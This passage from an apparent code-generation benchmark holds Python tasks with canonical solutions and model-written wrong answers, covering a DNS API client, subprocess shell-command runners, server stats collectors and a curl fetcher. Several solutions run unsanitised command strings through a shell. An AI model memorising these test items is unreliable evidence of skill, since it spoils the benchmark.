\"application/x-www-form-urlencoded\",\n            \"User-Agent\": \"DDNS/%s (ddns@newfuture.cc)\" % environ.get(\"DDNS_VERSION\", \"1.0.0\")\n        })\n        response = conn.getresponse()\n        res = response.read().decode('utf8')\n        conn.close()\n\n        if response.status < 200 or response.status >= 300:\n            raise Exception(res)\n        else:\n            data = jsondecode(res)\n            if not data:\n                raise Exception(\"empty response\")\n            elif data.get(\"status\", {}).get(\"code\") == \"1\":\n                return data\n            else:\n                raise Exception(data.get('status', {}))\n\n    def get_domain_info(self, domain):\n        domain_split = domain.split('.')\n        sub, did = None, None\n        main = domain_split.pop()\n        while domain_split:\n            main = domain_split.pop() + '.' + main\n            did = self.get_domain_id(main)\n            if did:\n                sub = \".\".join(domain_split) or '@'\n                break\n        return did, sub\n\n    def get_domain_id(self, domain):\n        if domain in self.domain_list:\n            return self.domain_list[domain]\n        else:\n            try:\n                info = self.request('Domain.Info', domain=domain)\n                did = info.get(\"domain\", {}).get(\"id\")\n                if did:\n                    self.domain_list[domain] = did\n                    return did\n            except Exception:\n                return None\n\n    def get_records(self, did, **conditions):\n        if did not in self.records:\n            self.records[did] = {}\n            data = self.request('Record.List', domain_id=did)\n            if data:\n                for record in data.get('records'):\n                    self.records[did][record[\"id\"]] = {\n                        k: v for (k, v) in record.items() if k in self.record_keys}\n\n        records = {}\n        for (rid, record) in self.records[did].items():\n            for (k, value) in conditions.items():\n                if record.get(k) != value:\n                    break\n            else:\n                records[rid] = record\n        return records\n\n    def update_record(self, domain, value, record_type=\"A\"):\n        domainid, sub = self.get_domain_info(domain)\n        if not domainid:\n            raise Exception(\"invalid domain: [ %s ] \" % domain)\n\n        records = self.get_records(domainid, name=sub, type=record_type)\n        result = {}\n        if records:\n            for (did, record) in records.items():\n                if record[\"value\"] != value:\n                    res = self.request('Record.Modify', \n                                     record_id=did, \n                                     record_line=record[\"line\"].replace(\"Default\", \"default\").encode(\"utf-8\"), \n                                     value=value, \n                                     sub_domain=sub, \n                                     domain_id=domainid, \n                                     record_type=record_type, \n                                     ttl=self.TTL)\n                    if res:\n                        self.records[domainid][did][\"value\"] = value\n                        result[did] = res.get(\"record\")\n                    else:\n                        result[did] = \"update fail!\\n\" + str(res)\n                else:\n                    result[did] = domain\n        else:\n            res = self.request(\"Record.Create\", \n                             domain_id=domainid, \n                             value=value,\n                             sub_domain=sub, \n                             record_type=record_type, \n                             record_line=self.DEFAULT, \n                             ttl=self.TTL)\n            if res:\n                did = res.get(\"record\")[\"id\"]\n                self.records[domainid][did] = res.get(\"record\")\n                self.records[domainid][did].update(\n                    value=value, sub_domain=sub, record_type=record_type)\n                result = res.get(\"record\")\n            else:\n                result = domain + \" created fail!\"\n        return result",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nimport requests\nimport time\n\nclass DNSPodAPI:\n    SITE = \"https://dnsapi.cn\"\n    METHOD = \"POST\"\n    TOKEN_PARAM = \"login_token\"\n    DEFAULT = \"\u9ed8\u8ba4\"\n    LENGTH = \"length\"\n    record_keys = (\"id\", \"name\", \"type\", \"value\", \"line\", \"ttl\")\n\n    def __init__(self, token_id=None, token_key=None, proxy=None, ttl=None):\n        self.ID = token_id\n        self.TOKEN = token_key\n        self.PROXY = proxy\n        self.TTL = ttl or 600\n        self.domain_list = {}\n        self.records = {}\n\n    def request(self, action, param=None, **params):\n        url = f\"{self.SITE}/{action}\"\n        headers = {\n            \"User-Agent\": \"DNSPodPython/1.0\",\n            \"Content-Type\": \"application/x-www-form-urlencoded\"\n        }\n        data = {\n            self.TOKEN_PARAM: f\"{self.ID},{self.TOKEN}\",\n            \"format\": \"json\",\n            \"lang\": \"en\",\n            \"error_page\": \"1\"\n        }\n\n        if param:\n            data.update(param)\n        data.update(params)\n\n        proxies = {\"http\": self.PROXY, \"https\": self.PROXY} if self.PROXY else None\n        response = requests.request(self.METHOD, url, headers=headers, data=data, proxies=proxies)\n        result = response.json()\n\n        if result.get(\"status\", {}).get(\"code\") != \"1\":\n            raise Exception(f\"API Error: {result.get('status', {}).get('message')}\")\n        return result\n\n    def get_domain_info(self, domain):\n        parts = domain.split(\".\")\n        subdomain = parts[0]\n        main_domain = \".\".join(parts[1:])\n        did = self.get_domain_id(main_domain)\n        return did, subdomain\n\n    def get_domain_id(self, domain):\n        if domain in self.domain_list:\n            return self.domain_list[domain]\n\n        result = self.request(\"Domain.List\", {self.LENGTH: 100})\n        for item in result[\"domains\"]:\n            if item[\"name\"] == domain:\n                self.domain_list[domain] = item[\"id\"]\n                return item[\"id\"]\n\n        raise Exception(f\"Domain {domain} not found.\")\n\n    def get_records(self, did, **conditions):\n        key = (did, tuple(sorted(conditions.items())))\n        if key in self.records:\n            return self.records[key]\n\n        result = self.request(\"Record.List\", {\"domain_id\": did, self.LENGTH: 100})\n        records = []\n        for record in result[\"records\"]:\n            if all(record[k] == v for k, v in conditions.items()):\n                records.append({k: record[k] for k in self.record_keys if k in record})\n        self.records[key] = records\n        return records\n\n    def update_record(self, domain, value, record_type=\"A\"):\n        did, name = self.get_domain_info(domain)\n        records = self.get_records(did, name=name, type=record_type)\n\n        if records:\n            record_id = records[0][\"id\"]\n            params = {\n                \"domain_id\": did,\n                \"record_id\": record_id,\n                \"sub_domain\": name,\n                \"record_type\": record_type,\n                \"record_line\": self.DEFAULT,\n                \"value\": value,\n                \"ttl\": self.TTL\n            }\n            result = self.request(\"Record.Modify\", params=params)\n        else:\n            params = {\n                \"domain_id\": did,\n                \"sub_domain\": name,\n                \"record_type\": record_type,\n                \"record_line\": self.DEFAULT,\n                \"value\": value,\n                \"ttl\": self.TTL\n            }\n            result = self.request(\"Record.Create\", params=params)\n        return result\n```"
  },
  {
    "Task_id": 300,
    "Instruction": "Task Description: Create a function that executes a shell command using Python's subprocess module and returns the output, error, and process object.\n\nFunction Description: The function SC (Shell Command) takes a shell command as input, executes it using subprocess.Popen, and captures both the standard output and standard error streams. It returns a tuple containing these outputs along with the process object for further interaction if needed.\n\nInput: \n- cmd: [str] - The shell command to be executed as a string.\n\nOutput: \n- Returns a tuple containing:\n  - out: [bytes] - The standard output of the executed command.\n  - err: [bytes] - The standard error of the executed command.\n  - proc: [subprocess.Popen] - The process object representing the executed command.",
    "Canonical_solution": "import os\nimport subprocess\n\ndef SC(cmd):\n    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)\n    [out, err] = proc.communicate()\n    return (out, err, proc)",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "```python\nimport subprocess\n\ndef SC(cmd):\n    proc = subprocess.Popen(\n        cmd,\n        shell=True,\n        stdout=subprocess.PIPE,\n        stderr=subprocess.PIPE\n    )\n    out, err = proc.communicate()\n    return out, err, proc\n```"
  },
  {
    "Task_id": 301,
    "Instruction": "Task Description: Implement a class to monitor and collect statistics about Passenger application server processes, including memory usage, CPU usage, and queue statistics.\n\nClass Description: The PassengerProcessCommunicator class is designed to interact with Passenger application server processes to gather various performance metrics. It uses subprocess communication to execute system commands and parse their outputs.\n\nAttributes:\n- config: [dict] - A configuration dictionary containing settings like command paths and sudo usage flags.\n\nMethods:\n- get_passenger_memory_stats() -> [dict] - Collects memory statistics for Apache, Nginx, and Passenger processes. Returns a dictionary with process lists and total memory usage.\n- get_passenger_cpu_usage(dict_stats: dict) -> [float] - Calculates total CPU usage percentage for all Passenger-related processes. Takes a dictionary of process stats and returns the total CPU usage.\n- get_passenger_queue_stats() -> [dict] - Gathers queue statistics from Passenger status, including top-level and application queue sizes. Returns a dictionary with queue metrics.",
    "Canonical_solution": "import subprocess\nimport re\nimport os\nfrom diamond.collector import str_to_bool\n\nclass PassengerProcessCommunicator:\n    def __init__(self, config):\n        self.config = config\n\n    def get_passenger_memory_stats(self):\n        command = [self.config[\"passenger_memory_stats_bin\"]]\n        if str_to_bool(self.config[\"use_sudo\"]):\n            command.insert(0, self.config[\"sudo_cmd\"])\n\n        try:\n            proc1 = subprocess.Popen(command, stdout=subprocess.PIPE)\n            (std_out, std_err) = proc1.communicate()\n        except OSError:\n            return {}\n\n        if std_out is None:\n            return {}\n\n        dict_stats = {\n            \"apache_procs\": [],\n            \"nginx_procs\": [],\n            \"passenger_procs\": [],\n            \"apache_mem_total\": 0.0,\n            \"nginx_mem_total\": 0.0,\n            \"passenger_mem_total\": 0.0,\n        }\n        \n        re_colour = re.compile(\"\\x1B\\[([0-9]{1,3}((;[0-9]{1,3})*)?)?[m|K]\")\n        re_digit = re.compile(\"^\\d\")\n        \n        apache_flag = 0\n        nginx_flag = 0\n        passenger_flag = 0\n        for raw_line in std_out.splitlines():\n            line = re_colour.sub(\"\", raw_line)\n            if \"Apache processes\" in line:\n                apache_flag = 1\n            elif \"Nginx processes\" in line:\n                nginx_flag = 1\n            elif \"Passenger processes\" in line:\n                passenger_flag = 1\n            elif re_digit.match(line):\n                line_splitted = line.split()\n                if apache_flag == 1:\n                    dict_stats[\"apache_procs\"].append(line_splitted[0])\n                    dict_stats[\"apache_mem_total\"] += float(line_splitted[4])\n                elif nginx_flag == 1:\n                    dict_stats[\"nginx_procs\"].append(line_splitted[0])\n                    dict_stats[\"nginx_mem_total\"] += float(line_splitted[4])\n                elif passenger_flag == 1:\n                    dict_stats[\"passenger_procs\"].append(line_splitted[0])\n                    dict_stats[\"passenger_mem_total\"] += float(line_splitted[3])\n            elif \"Processes:\" in line:\n                passenger_flag = 0\n                apache_flag = 0\n                nginx_flag = 0\n\n        return dict_stats\n\n    def get_passenger_cpu_usage(self, dict_stats):\n        try:\n            proc1 = subprocess.Popen(\n                [\"top\", \"-b\", \"-n\", \"2\"],\n                stdout=subprocess.PIPE)\n            (std_out, std_err) = proc1.communicate()\n        except OSError:\n            return -1\n\n        re_lspaces = re.compile(\"^\\s*\")\n        re_digit = re.compile(\"^\\d\")\n        overall_cpu = 0\n        for raw_line in std_out.splitlines():\n            line = re_lspaces.sub(\"\", raw_line)\n            if not re_digit.match(line):\n                continue\n\n            line_splitted = line.split()\n            if line_splitted[0] in dict_stats[\"apache_procs\"]:\n                overall_cpu += float(line_splitted[8])\n            elif line_splitted[0] in dict_stats[\"nginx_procs\"]:\n                overall_cpu += float(line_splitted[8])\n            elif line_splitted[0] in dict_stats[\"passenger_procs\"]:\n                overall_cpu += float(line_splitted[8])\n\n        return overall_cpu\n\n    def get_passenger_queue_stats(self):\n        queue_stats = {\n            \"top_level_queue_size\": 0.0,\n            \"passenger_queue_size\": 0.0,\n        }\n\n        command = [self.config[\"passenger_status_bin\"]]\n        if str_to_bool(self.config[\"use_sudo\"]):\n            command.insert(0, self.config[\"sudo_cmd\"])\n\n        try:\n            proc1 = subprocess.Popen(command, stdout=subprocess.PIPE)\n            (std_out, std_err) = proc1.communicate()\n        except OSError:\n            return {}\n\n        if std_out is None:\n            return {}\n\n        re_colour = re.compile(\"\\x1B\\[([0-9]{1,3}((;[0-9]{1,3})*)?)?[m|K]\")\n        re_requests = re.compile(r\"Requests\")\n        re_topqueue = re.compile(r\"^top-level\")\n\n        gen_info_flag = 0\n        app_groups_flag = 0\n        for raw_line in std_out.splitlines():\n            line = re_colour.sub(\"\", raw_line)\n            if \"General information\" in line:\n                gen_info_flag = 1\n            if \"Application groups\" in line:\n                app_groups_flag = 1\n            elif re_requests.match(line) and re_topqueue.search(line):\n                line_splitted = line.split()\n                if gen_info_flag == 1 and line_splitted:\n                    queue_stats[\"top_level_queue_size\"] = float(line_splitted[5])\n            elif re_requests.search(line) and not re_topqueue.search(line):\n                line_splitted = line.split()\n                if app_groups_flag == 1 and line_splitted:\n                    queue_stats[\"passenger_queue_size\"] = float(line_splitted[3])\n\n        return queue_stats",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
    "wrong_result": "```python\nimport subprocess\nimport re\n\nclass PassengerProcessCommunicator:\n    def __init__(self, config):\n        self.config = config\n\n    def get_passenger_memory_stats(self):\n        ps_cmd = self.config.get('ps_command', 'ps')\n        sudo = self.config.get('use_sudo', False)\n        passenger_processes = []\n        apache_processes = []\n        nginx_processes = []\n\n        total_memory_usage = 0\n\n        try:\n            if sudo:\n                cmd = ['sudo', ps_cmd, 'aux']\n            else:\n                cmd = [ps_cmd, 'aux']\n\n            output = subprocess.check_output(cmd).decode('utf-8')\n            lines = output.splitlines()\n\n            for line in lines[1:]:\n                parts = line.split()\n                if len(parts) < 11:\n                    continue\n                user, pid, cpu_percent, mem_percent, vsz, rss, tty, stat, start_time, time, command = parts[:11]\n                full_command = ' '.join(parts[10:])\n\n                memory_mb = float(rss) / 1024.0\n                total_memory_usage += memory_mb\n\n                if 'passenger' in command.lower():\n                    passenger_processes.append({\n                        'pid': pid,\n                        'memory_mb': memory_mb,\n                        'command': full_command\n                    })\n                elif 'apache' in command.lower() or 'httpd' in command.lower():\n                    apache_processes.append({\n                        'pid': pid,\n                        'memory_mb': memory_mb,\n                        'command': full_command\n                    })\n                elif 'nginx' in command.lower():\n                    nginx_processes.append({\n                        'pid': pid,\n                        'memory_mb': memory_mb,\n                        'command': full_command\n                    })\n\n        except Exception as e:\n            print(f\"Error retrieving memory stats: {e}\")\n\n        return {\n            'passenger': passenger_processes,\n            'apache': apache_processes,\n            'nginx': nginx_processes,\n            'total_memory_usage_mb': round(total_memory_usage, 2)\n        }\n\n    def get_passenger_cpu_usage(self, dict_stats):\n        total_cpu_usage = 0.0\n        for process_type in ['passenger', 'apache', 'nginx']:\n            for proc in dict_stats.get(process_type, []):\n                if 'cpu_percent' in proc:\n                    total_cpu_usage += float(proc['cpu_percent'])\n\n        return round(total_cpu_usage, 2)\n\n    def get_passenger_queue_stats(self):\n        status_cmd = self.config.get('passenger_status_command', 'passenger-status')\n        sudo = self.config.get('use_sudo', False)\n        queue_stats = {}\n\n        try:\n            if sudo:\n                cmd = ['sudo', status_cmd]\n            else:\n                cmd = [status_cmd]\n\n            output = subprocess.check_output(cmd).decode('utf-8')\n\n            top_level_match = re.search(r'Top-level queues:\\s+(\\d+)', output)\n            app_queues_match = re.search(r'Application queues:\\s+(\\d+)', output)\n\n            if top_level_match:\n                queue_stats['top_level'] = int(top_level_match.group(1))\n            if app_queues_match:\n                queue_stats['application'] = int(app_queues_match.group(1))\n\n        except Exception as e:\n            print(f\"Error retrieving queue stats: {e}\")\n\n        return queue_stats\n```"
  },
  {
    "Task_id": 302,
    "Instruction": "Task Description: Create a function that uses subprocess.Popen with pipes to execute a curl command, handle its output, and store the results in a database.\n\nFunction Description: The function executes a curl command as a subprocess to fetch HTTP headers from a URL using a SOCKS proxy. It handles timeouts, processes the output to extract HTTP status codes, and records all results (including errors) in a global database. The function includes a small delay between calls to avoid overwhelming the system.\n\nInput:\n- self: The object instance containing URL and attempt count (implicit in method context)\n- url: [str] - The target URL to fetch (accessed via self.url)\n- USER_AGENT: [str] - The user agent string for the HTTP request\n- SOCKS_PROXY: [str] - The SOCKS proxy address to use\n- CURL_TIMEOUT: [int] - Maximum time allowed for the curl command to complete\n\nOutput:\n- None (direct return value), but the function:\n  - Updates self.last_code with the HTTP status code\n  - Increments self.attempt counter\n  - Inserts a record into GLOBAL_DB containing:\n    - url: [str] - The requested URL\n    - attempt: [int] - The attempt number\n    - out: [bytes/str] - The curl command's stdout output\n    - err: [bytes/str] - The curl command's stderr output or error message\n    - http_code: [int] - The extracted HTTP status code\n    - curl_exit: [int] - The curl process's exit code",
    "Canonical_solution": "import subprocess\nimport time\n\ndef fetch1(self):\n    args = [ 'curl', '--head', '--user-agent', USER_AGENT, '--proxy', SOCKS_PROXY, self.url ]\n    time.sleep(1) # slight breathing space because MP\n    try:\n        p = subprocess.Popen(args, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.PIPE) # todo: text=True\n        (out, err) = p.communicate(timeout=CURL_TIMEOUT)\n        hcode = extract_hcode(str(out)) # str() not needed if text=True\n        if hcode == 200: err = PLACEHOLDER\n        ecode = p.returncode\n    except subprocess.TimeoutExpired as e:\n        (out, err) = (PLACEHOLDER, str(e))\n        hcode = BADNESS + 10\n        ecode = BADNESS + 10\n    self.last_code = hcode\n    self.attempt += 1\n    GLOBAL_DB.insert(dict(\n        url=self.url,\n        attempt=self.attempt,\n        out=out,\n        err=err,\n        http_code=hcode,\n        curl_exit=ecode,\n    ))",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "```python\nimport subprocess\nimport time\nimport re\nimport shlex\n\ndef fetch_with_curl(self, url, USER_AGENT, SOCKS_PROXY, CURL_TIMEOUT):\n    self.attempt += 1\n    cmd = (\n        f\"curl -s --connect-timeout {CURL_TIMEOUT} \"\n        f\"-x socks5://{SOCKS_PROXY} \"\n        f\"-A '{USER_AGENT}' \"\n        f\"--head '{url}'\"\n    )\n    process = subprocess.Popen(\n        shlex.split(cmd),\n        stdout=subprocess.PIPE,\n        stderr=subprocess.PIPE\n    )\n\n    try:\n        out, err = process.communicate(timeout=CURL_TIMEOUT)\n    except subprocess.TimeoutExpired:\n        process.kill()\n        out, err = process.communicate()\n        curl_exit = -1\n        http_code = -1\n        err += b\" [CURL command timed out]\"\n    else:\n        curl_exit = process.returncode\n        http_code_match = re.search(rb'HTTP/[0-9]\\.[0-9] ([0-9]{3})', out)\n        http_code = int(http_code_match.group(1)) if http_code_match else -1\n\n    self.last_code = http_code\n\n    GLOBAL_DB.insert({\n        'url': url,\n        'attempt': self.attempt,\n        'out': out.decode(errors='ignore'),\n        'err': err.decode(errors='ignore'),\n        'http_code': http_code,\n        'curl_exit': curl_exit\n    })\n\n    time.sleep(0.1)\n```"
  },
  {
    "Task_id": 303,
    "Instruction": "Task Description: Create a Python class that collects and parses statistics from the amavisd-agent program using subprocess communication.\n\nClass Description: The AmavisCollector class is designed to interface with the amavisd-agent program to collect mail processing statistics. It uses subprocess.PIPE to communicate with the agent process and regular expressions to parse the output. The class supports optional sudo execution for privilege escalation.\n\nAttributes:\n\nmatchers: [List[re.Pattern]] - A list of compiled regular expressions used to parse different formats of statistics from amavisd-agent output.\nconfig: [Dict[str, Any]] - Configuration dictionary containing paths to executables and sudo settings.\n\nMethods:\n\n__init__: [Name](amavisd_exe: str = '/usr/sbin/amavisd-agent', use_sudo: bool = False, sudo_exe: str = '/usr/bin/sudo', sudo_user: str = 'amavis') -> None - Initializes the collector with configuration parameters for the amavisd-agent executable and optional sudo settings.\ncollect: [Name]() -> Generator[Tuple[str, str, str], None, None] - Executes the amavisd-agent process, captures its output, and yields parsed statistics as tuples of (metric_name, metric_type, value). Raises an exception if the process cannot be executed.",
    "Canonical_solution": "import os\nimport subprocess\nimport re\n\nclass AmavisCollector:\n    matchers = [\n        re.compile(r'^\\s*(?P<name>[\\w]+)\\s+(?P<time>[\\d]+) s\\s+'\n                   r'(?P<frequency>[\\d.]+) s/msg\\s+\\([\\w]+\\)\\s*$'),\n        re.compile(r'^\\s*(?P<name>[\\w.-]+)\\s+(?P<count>[\\d]+)\\s+'\n                   r'(?P<frequency>[\\d.]+)/h\\s+(?P<percentage>[\\d.]+) %'\n                   r'\\s\\([\\w]+\\)\\s*$'),\n        re.compile(r'^\\s*(?P<name>[\\w.-]+)\\s+(?P<size>[\\d]+)MB\\s+'\n                   r'(?P<frequency>[\\d.]+)MB/h\\s+(?P<percentage>[\\d.]+) %'\n                   r'\\s\\([\\w]+\\)\\s*$'),\n    ]\n\n    def __init__(self, amavisd_exe='/usr/sbin/amavisd-agent', use_sudo=False, sudo_exe='/usr/bin/sudo', sudo_user='amavis'):\n        self.config = {\n            'amavisd_exe': amavisd_exe,\n            'use_sudo': use_sudo,\n            'sudo_exe': sudo_exe,\n            'sudo_user': sudo_user\n        }\n\n    def collect(self):\n        try:\n            if self.config['use_sudo']:\n                cmdline = [\n                    self.config['sudo_exe'], '-u', self.config['sudo_user'],\n                    '--', self.config['amavisd_exe'], '-c', '1'\n                ]\n            else:\n                cmdline = [self.config['amavisd_exe'], '-c', '1']\n                \n            agent = subprocess.Popen(cmdline, stdout=subprocess.PIPE)\n            agent_out = agent.communicate()[0]\n            lines = agent_out.strip().split(os.linesep)\n            \n            for line in lines:\n                for rex in self.matchers:\n                    res = rex.match(line)\n                    if res:\n                        groups = res.groupdict()\n                        name = groups['name']\n                        for metric, value in groups.items():\n                            if metric == 'name':\n                                continue\n                            yield (name, metric, value)\n\n        except OSError as err:\n            raise Exception(f\"Could not run {self.config['amavisd_exe']}: {err}\")",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
    "wrong_result": "```python\nimport re\nimport subprocess\nfrom typing import List, Dict, Any, Generator, Tuple\n\nclass AmavisCollector:\n    def __init__(\n        self,\n        amavisd_exe: str = '/usr/sbin/amavisd-agent',\n        use_sudo: bool = False,\n        sudo_exe: str = '/usr/bin/sudo',\n        sudo_user: str = 'amavis'\n    ) -> None:\n        self.config = {\n            'amavisd_exe': amavisd_exe,\n            'use_sudo': use_sudo,\n            'sudo_exe': sudo_exe,\n            'sudo_user': sudo_user\n        }\n        self.matchers = [\n            re.compile(r'^(\\w+):\\s+(\\d+)$'),\n            re.compile(r'^(\\w+):\\s+(\\d+)\\s+(\\d+)$')\n        ]\n\n    def collect(self) -> Generator[Tuple[str, str, str], None, None]:\n        cmd = [self.config['amavisd_exe'], '--show-stats']\n        if self.config['use_sudo']:\n            cmd = [\n                self.config['sudo_exe'],\n                '-u', self.config['sudo_user'],\n                '--', *cmd\n            ]\n        process = subprocess.Popen(\n            cmd,\n            stdout=subprocess.PIPE,\n            stderr=subprocess.PIPE,\n            stdin=subprocess.PIPE,\n            text=True\n        )\n        stdout_data, stderr_data = process.communicate()\n        if process.returncode != 0:\n            raise Exception(f'Failed to execute amavisd-agent: {stderr_data}')\n        for line in stdout_data.splitlines():\n            for matcher in self.matchers:\n                match = matcher.match(line)\n                if match:\n                    groups = match.groups()\n                    metric_name = groups[0]\n                    if len(groups) == 2:\n                        yield (metric_name, 'counter', groups[1])\n                    elif len(groups) == 3:\n                        yield (f'{metric_name}_total', 'counter', groups[1])\n                        yield (f'{metric_name}_current', 'gauge', groups[2])\n```"
  },
  {
    "Task_id": 304,
    "Instruction": "Task Description: Create a function that executes a system command using Python's subprocess module and returns the output.\n\nFunction Description: The function should take a system command as input, execute it in a subprocess, capture the standard output, and return it as a string. The function should handle the process creation, communication, and cleanup automatically.\n\nInput: \n- com: str - A string representing the system command to be executed\n\nOutput:\n- str - The decoded standard output from the executed command",
    "Canonical_solution": "import urllib.request\nimport subprocess\n\ndef excuteCommand(com):\n    ex = subprocess.Popen(com, stdout=subprocess.PIPE, shell=True)\n    out, err = ex.communicate()\n    statusofssh = ex.wait()\n    return out.decode()",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "```python\nimport subprocess\n\ndef execute_command(com):\n    result = subprocess.run(com, shell=True, capture_output=True, text=True)\n    return result.stdout\n```"
  },
  {
    "Task_id": 305,
    "Instruction": "Task Description: The task involves creating Python functions for executing system commands and processing their output through inter-process communication (IPC) using pipes. The functions should handle command execution, output decoding, and temporary file management for command processing.\n\nFunction Description: The provided functions enable executing system commands through subprocesses, capturing and decoding their output, and processing text data through temporary files when needed. The functions handle Windows-specific configurations and character encoding.\n\nInput:\n- For run_and_read(view, cmd):\n  - view: [Any] - A placeholder parameter (unused in function)\n  - cmd: [str] - The command string to execute via cmd.exe\n\n- For filter_region(view, txt, command):\n  - view: [Any] - A placeholder parameter (unused in function)\n  - txt: [str] - The text content to process\n  - command: [str] - The command to process the text with\n\n- For get_startup_info() and get_oem_cp(): No input parameters\n\nOutput:\n- For run_and_read(): [str] - The decoded output from the command execution\n- For filter_region(): [str] - The processed text output from the command\n- For get_startup_info(): [subprocess.STARTUPINFO] - Windows process startup configuration\n- For get_oem_cp(): [str] - The OEM code page identifier as a string",
    "Canonical_solution": "import subprocess\nfrom subprocess import PIPE\nimport os\nimport tempfile\nimport ctypes\n\ndef get_startup_info():\n    startupinfo = subprocess.STARTUPINFO()\n    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW\n    return startupinfo\n\ndef run_and_read(view, cmd):\n    out, err = subprocess.Popen(['cmd.exe', '/c', cmd],\n                                stdout=PIPE,\n                                stderr=PIPE,\n                                shell=True,\n                                startupinfo=get_startup_info()).communicate()\n    try:\n        return (out or err).decode(get_oem_cp()).replace('\\r\\n', '\\n')\n    except AttributeError:\n        return ''\n\ndef filter_region(view, txt, command):\n    try:\n        contents = tempfile.NamedTemporaryFile(suffix='.txt', delete=False)\n        contents.write(txt.encode('utf-8'))\n        contents.close()\n\n        script = tempfile.NamedTemporaryFile(suffix='.bat', delete=False)\n        script.write(('@echo off\\ntype %s | %s' % (contents.name, command)).encode('utf-8'))\n        script.close()\n\n        p = subprocess.Popen([script.name],\n                             stdout=PIPE,\n                             stderr=PIPE,\n                             startupinfo=get_startup_info())\n\n        out, err = p.communicate()\n        return (out or err).decode(get_oem_cp()).replace('\\r\\n', '\\n')[:-1].strip()\n    finally:\n        os.remove(script.name)\n        os.remove(contents.name)\n\ndef get_oem_cp():\n    codepage = ctypes.windll.kernel32.GetOEMCP()\n    return str(codepage)",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "```python\nimport subprocess\nimport tempfile\nimport os\n\ndef get_startup_info():\n    si = subprocess.STARTUPINFO()\n    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW\n    si.wShowWindow = subprocess.SW_HIDE\n    return si\n\ndef get_oem_cp():\n    try:\n        import ctypes\n        kernel32 = ctypes.windll.kernel32\n        return str(kernel32.GetOEMCP())\n    except:\n        return '437'\n\ndef run_and_read(view, cmd):\n    startupinfo = get_startup_info()\n    oem_cp = get_oem_cp()\n    proc = subprocess.Popen(\n        ['cmd.exe', '/c', cmd],\n        stdout=subprocess.PIPE,\n        stderr=subprocess.PIPE,\n        stdin=subprocess.PIPE,\n        startupinfo=startupinfo,\n        encoding='utf-8',\n        errors='replace'\n    )\n    stdout, stderr = proc.communicate()\n    if stderr:\n        return stderr\n    return stdout\n\ndef filter_region(view, txt, command):\n    with tempfile.NamedTemporaryFile(mode='w+t', delete=False, encoding='utf-8', newline='') as tmpfile:\n        tmpfile.write(txt)\n        tmpfile.flush()\n        tmpname = tmpfile.name\n\n    try:\n        escaped_cmd = command.replace('%s', tmpname)\n        output = run_and_read(view, escaped_cmd)\n        return output\n    finally:\n        os.remove(tmpname)\n```"
  },
  {
    "Task_id": 307,
    "Instruction": "Task Description: The task involves creating a function that executes a command in a subprocess, captures its output, and extracts specific metrics from the output for analysis.\n\nFunction Description: The function `run_gpt` executes a given command as a subprocess, captures its standard output and error streams, and parses the output to extract metrics such as runtime, number of parameters, and success status. It then returns these metrics along with any error messages.\n\nInput: \n- `cmd` (str): A string representing the command to be executed in the subprocess.\n\nOutput: \n- A tuple containing:\n  - `runtime` (float): The average iteration time extracted from the output.\n  - `num_params` (float): The number of parameters in billions, rounded to 3 decimal places.\n  - `success` (bool): A boolean indicating whether the test was successful based on a predefined success message.\n  - `errs` (bytes): The error output from the subprocess.",
    "Canonical_solution": "import subprocess\nfrom apex.transformer.testing.commons import TEST_SUCCESS_MESSAGE\n\ndef run_gpt(cmd):\n    args = list(cmd.split(\" \"))\n    p = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    outs, errs = p.communicate()\n    outs = list(str((outs).decode(\"utf-8\")).splitlines())\n    success = False\n    runtime = 0\n    num_params = 0\n    for out in outs:\n        out = str(out)\n        if \"Average Iteration Time:\" in str(out):\n            slicey = out[out.find(\":\") + 2 :]\n            try:\n                runtime = float(slicey)\n            except:\n                print(slicey)\n                quit()\n        if \"Number of Parameters:\" in str(out):\n            slicey = out[out.find(\":\") + 2 :]\n            try:\n                num_params = int(slicey)\n            except:\n                print(slicey)\n                quit()\n        if str(out) == str(TEST_SUCCESS_MESSAGE):\n            success = True\n    return runtime, round(float(int(num_params)) / 10.0 ** 9, 3), success, errs",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "```python\nimport subprocess\n\ndef run_gpt(cmd):\n    process = subprocess.Popen(\n        cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE\n    )\n    stdout, stderr = process.communicate()\n    errs = stderr\n\n    runtime = 0.0\n    num_params = 0.0\n    success = False\n\n    output_lines = stdout.decode().splitlines()\n    for line in output_lines:\n        if \"average iteration time\" in line:\n            try:\n                runtime = float(line.split(\":\")[1].strip().split()[0])\n            except (IndexError, ValueError):\n                pass\n        if \"number of parameters\" in line:\n            try:\n                params_str = line.split(\":\")[1].strip()\n                num_params = round(float(params_str.split()[0]) / 1e9, 3)\n            except (IndexError, ValueError):\n                pass\n        if \"Test successful\" in line:\n            success = True\n\n    return runtime, num_params, success, errs\n```"
  },
  {
    "Task_id": 308,
    "Instruction": "Task Description: Write a Python function that queries DNS information for a given domain using the `dig` command, with options for TCP protocol and IPv6.\n\nFunction Description: The function `query_domain` executes a DNS query using the `dig` command-line tool. It retrieves the CNAME and IP address for the specified domain, with configurable query type and DNS server. The function supports TCP protocol and IPv6 queries. It parses the output to extract the first valid CNAME and IP address.\n\nInput:\n- `domain`: [str] - The domain name to query\n- `tcp`: [bool] - Whether to use TCP protocol for the DNS query (default: False)\n- `config`: [dict] - Configuration dictionary containing:\n  - `querytype`: [str] - DNS query type (e.g., 'A', 'AAAA')\n  - `dns`: [str] - DNS server address to query\n\nOutput:\n- [tuple] - A tuple containing:\n  - First valid CNAME found (str), empty string if none\n  - First valid IP address found (str), empty string if none",
